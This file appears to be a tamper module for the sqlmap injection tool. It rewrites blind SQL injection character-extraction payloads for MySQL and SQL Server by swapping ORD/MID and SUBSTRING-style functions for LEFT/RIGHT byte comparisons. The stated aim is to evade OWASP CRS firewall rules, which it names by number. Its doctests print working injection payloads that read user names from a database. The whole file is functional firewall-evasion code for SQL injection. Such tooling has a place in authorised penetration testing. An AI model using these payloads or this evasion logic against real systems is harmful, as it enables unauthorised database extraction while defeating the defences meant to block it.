#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def _balancedEnd(payload, start):
    """Index of the ')' matching the '(' at payload[start] (or -1)."""
    depth = 0
    idx = start
    while idx < len(payload):
        if payload[idx] == '(':
            depth += 1
        elif payload[idx] == ')':
            depth -= 1
            if depth == 0:
                return idx
        idx += 1
    return -1

def _reshape(payload, opener, tail, build):
    """Replace every 'opener(<balanced query>)<tail>' with build(query, tail-match)."""
    retVal = payload
    pos = 0
    while True:
        match = re.search(opener, retVal[pos:])
        if not match:
            break
        start = pos + match.start()
        cursor = pos + match.end()                  # should sit on the '(' of the query argument
        if cursor >= len(retVal) or retVal[cursor] != '(':
            pos = pos + match.end()
            continue
        end = _balancedEnd(retVal, cursor)
        if end < 0:
            pos = pos + match.end()
            continue
        query = retVal[cursor:end + 1]              # '(<query>)'
        rest = re.match(tail, retVal[end + 1:])
        if not rest:
            pos = pos + match.end()
            continue
        replacement = build(query, rest)
        retVal = retVal[:start] + replacement + retVal[end + 1 + rest.end():]
        pos = start + len(replacement)
    return retVal

def tamper(payload, **kwargs):
    """
    Rewrites blind single-character reads into a firewall-transparent, byte-ordered comparison that
    sheds the function names anomaly-scoring WAFs key on:

      * MySQL:      ORD(MID((<q>),<p>,1))><n>
                 -> RIGHT(LEFT((<q>),<p>),(<p><=CHAR_LENGTH((<q>))))>BINARY 0x<nn>
      * SQL Server: UNICODE(SUBSTRING((<q>),<p>,1))><n>   (also ASCII(SUBSTRING(...)))
                 -> CAST(RIGHT(LEFT((<q>),<p>),CASE WHEN <p><=LEN((<q>)) THEN 1 ELSE 0 END) AS VARBINARY)>0x<nn>

    Requirement:
        * MySQL or Microsoft SQL Server

    Notes:
        * Bypasses anomaly-scoring WAFs (e.g. OWASP CRS) that score the function names
          ORD/MID/ASCII/SUBSTRING/UNICODE (rule 942151) and the function-comparison shape (942190).
          LEFT/RIGHT are not in those blocklists, so the cumulative score collapses (often to 0) while
          the single-character, byte-ordered semantics of the bisection are preserved.
        * MySQL 'BINARY' / SQL Server '... AS VARBINARY' force a byte (case- and accent-sensitive)
          comparison, so extraction stays exact under a case-insensitive default collation. Both use a
          native hex literal (0x<nn>), so nothing needs string-escaping.
        * The character count is guarded (1 inside the string, 0 past its end), so a position beyond the
          end yields RIGHT(...,0)='' which compares below every byte - the NULL terminator that stops
          extraction, exactly like the original. A constant 1 would keep returning the last character
          forever and never terminate.

    >>> tamper('1 AND ORD(MID((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5,1))>71')
    '1 AND RIGHT(LEFT((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5),(5<=CHAR_LENGTH((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1))))>BINARY 0x47'
    >>> tamper('1 AND ORD(MID((SELECT 1),1,1))>0')
    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=CHAR_LENGTH((SELECT 1))))>BINARY 0x00'
    >>> tamper('1 AND 5141=5141')
    '1 AND 5141=5141'
    >>> tamper('1 AND ORD(MID((SELECT 1),1,1))<65')
    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=CHAR_LENGTH((SELECT 1))))<BINARY 0x41'
    >>> tamper('1 AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM users),3,1))>64')
    '1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40'
    """

    if not payload:
        return payload

    def _mysql(query, rest):
        position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
        return "RIGHT(LEFT(%s,%s),(%s<=CHAR_LENGTH(%s)))%sBINARY 0x%02x" % (query, position, position, query, operator, value)

    def _mssql(query, rest):
        position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
        # shed sqlmap's SQL Server retrieval wrapper 'ISNULL(CAST(<x> AS NVARCHAR(<n>)),CHAR(<m>))' -> '(<x>)':
        # CHAR()/CAST are themselves scored by ASCII/SUBSTRING-class WAFs (unlike MySQL's 0x20 hex), so for a
        # clean inner query the whole read goes function-free (NULLs then read as end-of-string)
        query = re.sub(r"(?i)ISNULL\(CAST\((.+?) AS NVARCHAR\(\d+\)\),\s*CHAR\(\d+\)\)", r"(\1)", query)
        return "CAST(RIGHT(LEFT(%s,%s),CASE WHEN %s<=LEN(%s) THEN 1 ELSE 0 END) AS VARBINARY)%s0x%02x" % (query, position, position, query, operator, value)

    comma_tail = r"\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)"
    retVal = _reshape(payload, r"(?i)ORD\(MID\(", comma_tail, _mysql)
    retVal = _reshape(retVal, r"(?i)(?:UNICODE|ASCII)\(SUBSTRING\(", comma_tail, _mssql)
    return retVal
